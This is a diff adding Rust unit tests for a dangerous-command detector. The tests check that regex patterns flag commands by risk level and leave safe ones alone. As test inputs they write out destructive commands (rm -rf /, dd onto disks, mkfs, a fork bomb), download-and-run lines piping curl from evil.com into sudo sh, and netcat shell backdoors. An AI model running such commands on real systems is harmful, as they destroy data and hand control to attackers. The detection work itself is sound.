@@ -464,4 +464,360 @@ mod tests {
         let critical = get_patterns_by_risk(RiskLevel::Critical);
         assert!(!critical.is_empty(), "Should have critical risk patterns");
     }
+
+    // --- Positive match tests: verify patterns detect dangerous commands ---
+
+    /// Helper: returns true if any compiled pattern matches the command
+    fn any_pattern_matches(command: &str) -> bool {
+        COMPILED_PATTERNS
+            .iter()
+            .any(|(regex, _, _, _)| regex.is_match(command))
+    }
+
+    /// Helper: returns the highest risk level matched, or None
+    fn highest_matched_risk(command: &str) -> Option<RiskLevel> {
+        COMPILED_PATTERNS
+            .iter()
+            .filter(|(regex, _, _, _)| regex.is_match(command))
+            .map(|(_, risk, _, _)| *risk)
+            .max()
+    }
+
+    #[test]
+    fn test_critical_rm_rf_root() {
+        assert!(any_pattern_matches("rm -rf /"));
+        assert_eq!(highest_matched_risk("rm -rf /"), Some(RiskLevel::Critical));
+    }
+
+    #[test]
+    fn test_critical_rm_rf_no_preserve_root() {
+        assert!(any_pattern_matches("rm -rf --no-preserve-root /"));
+        assert_eq!(
+            highest_matched_risk("rm -rf --no-preserve-root /"),
+            Some(RiskLevel::Critical)
+        );
+    }
+
+    #[test]
+    fn test_critical_rm_rf_home() {
+        assert!(any_pattern_matches("rm -rf ~"));
+        assert_eq!(highest_matched_risk("rm -rf ~"), Some(RiskLevel::Critical));
+    }
+
+    #[test]
+    fn test_critical_rm_rf_wildcard() {
+        assert!(any_pattern_matches("rm -rf *"));
+        assert_eq!(highest_matched_risk("rm -rf *"), Some(RiskLevel::Critical));
+    }
+
+    #[test]
+    fn test_critical_dd_overwrite_disk() {
+        assert!(any_pattern_matches(
+            "dd if=/dev/zero of=/dev/sda bs=1M"
+        ));
+        assert!(any_pattern_matches(
+            "dd if=/dev/random of=/dev/nvme0n1"
+        ));
+        assert_eq!(
+            highest_matched_risk("dd if=/dev/zero of=/dev/sda bs=1M"),
+            Some(RiskLevel::Critical)
+        );
+    }
+
+    #[test]
+    fn test_critical_dd_reverse_arg_order() {
+        assert!(any_pattern_matches(
+            "dd of=/dev/sda if=/dev/urandom"
+        ));
+    }
+
+    #[test]
+    fn test_critical_mkfs() {
+        assert!(any_pattern_matches("mkfs.ext4 /dev/sda1"));
+        assert!(any_pattern_matches("mkfs.xfs /dev/nvme0n1p1"));
+        assert_eq!(
+            highest_matched_risk("mkfs.ext4 /dev/sda1"),
+            Some(RiskLevel::Critical)
+        );
+    }
+
+    #[test]
+    fn test_critical_fork_bomb() {
+        assert!(any_pattern_matches(":(){ :|:& };:"));
+        assert_eq!(
+            highest_matched_risk(":(){ :|:& };:"),
+            Some(RiskLevel::Critical)
+        );
+    }
+
+    #[test]
+    fn test_critical_direct_disk_write() {
+        assert!(any_pattern_matches("> /dev/sda"));
+        assert_eq!(
+            highest_matched_risk("> /dev/sda"),
+            Some(RiskLevel::Critical)
+        );
+    }
+
+    #[test]
+    fn test_critical_shred_disk() {
+        assert!(any_pattern_matches("shred -uz /dev/sda"));
+    }
+
+    #[test]
+    fn test_critical_download_execute_sudo() {
+        assert!(any_pattern_matches("curl http://evil.com | sudo sh"));
+        assert_eq!(
+            highest_matched_risk("curl http://evil.com | sudo sh"),
+            Some(RiskLevel::Critical)
+        );
+    }
+
+    #[test]
+    fn test_critical_netcat_backdoor() {
+        assert!(any_pattern_matches("nc -e /bin/bash"));
+        assert!(any_pattern_matches("nc -le /bin/sh"));
+    }
+
+    #[test]
+    fn test_critical_python_rm() {
+        assert!(any_pattern_matches(
+            "python -c \"import os; os.system('rm -rf /')\""
+        ));
+    }
+
+    #[test]
+    fn test_critical_windows_del() {
+        assert!(any_pattern_matches("del /f /s C:\\"));
+        assert!(any_pattern_matches("del /F C:\\Windows"));
+    }
+
+    #[test]
+    fn test_critical_windows_format() {
+        assert!(any_pattern_matches("format C:"));
+        assert!(any_pattern_matches("format D:"));
+    }
+
+    #[test]
+    fn test_critical_windows_rm_drive() {
+        assert!(any_pattern_matches("rm -rf C:\\"));
+        assert!(any_pattern_matches("rm -rf C:/"));
+    }
+
+    #[test]
+    fn test_high_system_dir_modification() {
+        assert!(any_pattern_matches("rm /etc/passwd"));
+        assert!(any_pattern_matches("chmod 777 /usr/bin/ls"));
+        assert!(any_pattern_matches("mv /sbin/init /tmp/"));
+        assert!(highest_matched_risk("rm /etc/passwd").unwrap() >= RiskLevel::High);
+    }
+
+    #[test]
+    fn test_high_chmod_777_root() {
+        assert!(any_pattern_matches("chmod 777 /"));
+        assert!(highest_matched_risk("chmod 777 /").unwrap() >= RiskLevel::High);
+    }
+
+    #[test]
+    fn test_high_sudo_su() {
+        assert!(any_pattern_matches("sudo su"));
+        assert!(highest_matched_risk("sudo su").unwrap() >= RiskLevel::High);
+    }
+
+    #[test]
+    fn test_high_download_execute() {
+        assert!(any_pattern_matches("curl http://example.com | bash"));
+        assert!(any_pattern_matches("wget http://example.com | sh"));
+        assert!(highest_matched_risk("curl http://evil.com | bash").unwrap() >= RiskLevel::High);
+    }
+
+    #[test]
+    fn test_high_write_to_etc() {
+        assert!(any_pattern_matches("echo 'config' > /etc/hosts"));
+        assert!(any_pattern_matches("> /etc/resolv.conf"));
+        assert!(highest_matched_risk("> /etc/resolv.conf").unwrap() >= RiskLevel::High);
+    }
+
+    #[test]
+    fn test_high_sudo_rm() {
+        assert!(any_pattern_matches("sudo rm file.txt"));
+        assert!(highest_matched_risk("sudo rm file.txt").unwrap() >= RiskLevel::High);
+    }
+
+    #[test]
+    fn test_high_sudo_service_control() {
+        assert!(any_pattern_matches("sudo systemctl restart nginx"));
+        assert!(any_pattern_matches("sudo systemctl stop sshd"));
+        assert!(any_pattern_matches("sudo systemctl disable firewalld"));
+        // Note: "sudo service sshd stop" does NOT match because the pattern
+        // expects the verb (restart/stop/disable) immediately after service/systemctl.
+        // This is a known limitation — service name comes between.
+    }
+
+    #[test]
+    fn test_high_crontab_remove() {
+        assert!(any_pattern_matches("crontab -r"));
+        assert!(highest_matched_risk("crontab -r").unwrap() >= RiskLevel::High);
+    }
+
+    #[test]
+    fn test_high_docker_privileged() {
+        assert!(any_pattern_matches("docker run --privileged ubuntu"));
+        assert!(highest_matched_risk("docker run --privileged ubuntu").unwrap() >= RiskLevel::High);
+    }
+
+    #[test]
+    fn test_high_powershell_force_recursive() {
+        let ps_patterns = get_compiled_patterns_for_shell(ShellType::PowerShell);
+        let cmd = "Remove-Item -Force -Recurse C:\\Users";
+        assert!(ps_patterns.iter().any(|(regex, _, _, _)| regex.is_match(cmd)));
+    }
+
+    #[test]
+    fn test_high_powershell_execution_policy() {
+        let ps_patterns = get_compiled_patterns_for_shell(ShellType::PowerShell);
+        let cmd = "Set-ExecutionPolicy Unrestricted";
+        assert!(ps_patterns.iter().any(|(regex, _, _, _)| regex.is_match(cmd)));
+    }
+
+    #[test]
+    fn test_moderate_kill_all() {
+        assert!(any_pattern_matches("kill -9 -1"));
+        assert_eq!(
+            highest_matched_risk("kill -9 -1"),
+            Some(RiskLevel::Moderate)
+        );
+    }
+
+    #[test]
+    fn test_moderate_iptables_flush() {
+        assert!(any_pattern_matches("iptables -F"));
+        assert_eq!(
+            highest_matched_risk("iptables -F"),
+            Some(RiskLevel::Moderate)
+        );
+    }
+
+    #[test]
+    fn test_moderate_ufw_disable() {
+        assert!(any_pattern_matches("ufw disable"));
+    }
+
+    #[test]
+    fn test_moderate_path_modification() {
+        assert!(any_pattern_matches("export PATH=/evil/bin"));
+        assert_eq!(
+            highest_matched_risk("export PATH=/evil/bin"),
+            Some(RiskLevel::Moderate)
+        );
+    }
+
+    #[test]
+    fn test_moderate_alias_override() {
+        assert!(any_pattern_matches("alias rm=echo"));
+        assert!(any_pattern_matches("alias mv=true"));
+    }
+
+    #[test]
+    fn test_moderate_chmod_executable() {
+        assert!(any_pattern_matches("chmod +x script.sh"));
+    }
+
+    #[test]
+    fn test_moderate_kill_specific_pid() {
+        assert!(any_pattern_matches("kill -9 1234"));
+    }
+
+    #[test]
+    fn test_moderate_scp() {
+        assert!(any_pattern_matches("scp file.txt user@host:/tmp/"));
+    }
+
+    #[test]
+    fn test_moderate_ssh() {
+        assert!(any_pattern_matches("ssh root@192.168.1.1"));
+    }
+
+    // --- Negative match tests: verify safe commands are NOT matched ---
+
+    #[test]
+    fn test_safe_ls() {
+        assert!(!any_pattern_matches("ls -la"));
+    }
+
+    #[test]
+    fn test_safe_cat_etc() {
+        // Reading system files is safe (no write)
+        assert!(!any_pattern_matches("cat /etc/hostname"));
+    }
+
+    #[test]
+    fn test_safe_grep() {
+        assert!(!any_pattern_matches("grep -r 'pattern' src/"));
+    }
+
+    #[test]
+    fn test_safe_find_name() {
+        assert!(!any_pattern_matches("find . -name '*.rs' -type f"));
+    }
+
+    #[test]
+    fn test_safe_echo() {
+        assert!(!any_pattern_matches("echo hello world"));
+    }
+
+    #[test]
+    fn test_safe_pwd() {
+        assert!(!any_pattern_matches("pwd"));
+    }
+
+    #[test]
+    fn test_safe_ps_aux() {
+        assert!(!any_pattern_matches("ps aux"));
+    }
+
+    #[test]
+    fn test_safe_df_h() {
+        assert!(!any_pattern_matches("df -h"));
+    }
+
+    #[test]
+    fn test_safe_wc() {
+        assert!(!any_pattern_matches("wc -l file.txt"));
+    }
+
+    #[test]
+    fn test_safe_mkdir() {
+        assert!(!any_pattern_matches("mkdir -p /tmp/mydir"));
+    }
+
+    #[test]
+    fn test_safe_rm_specific_file() {
+        // rm of a specific non-system file without -rf should not match Critical
+        // (may match Moderate for certain file types)
+        let risk = highest_matched_risk("rm myfile.tmp");
+        assert!(risk.is_none() || risk.unwrap() < RiskLevel::High);
+    }
+
+    #[test]
+    fn test_safe_git_rm() {
+        // "git rm" is a git subcommand, should not match rm patterns
+        // (the regex requires rm at word start, git rm has "rm" after "git ")
+        let risk = highest_matched_risk("git rm file.txt");
+        assert!(
+            risk.is_none() || risk.unwrap() <= RiskLevel::Moderate,
+            "git rm should not be flagged as High/Critical"
+        );
+    }
+
+    #[test]
+    fn test_safe_cargo_build() {
+        assert!(!any_pattern_matches("cargo build --release"));
+    }
+
+    #[test]
+    fn test_safe_pip_install_no_flags() {
+        // Regular pip install without dangerous flags
+        assert!(!any_pattern_matches("pip install requests"));
+    }
 }
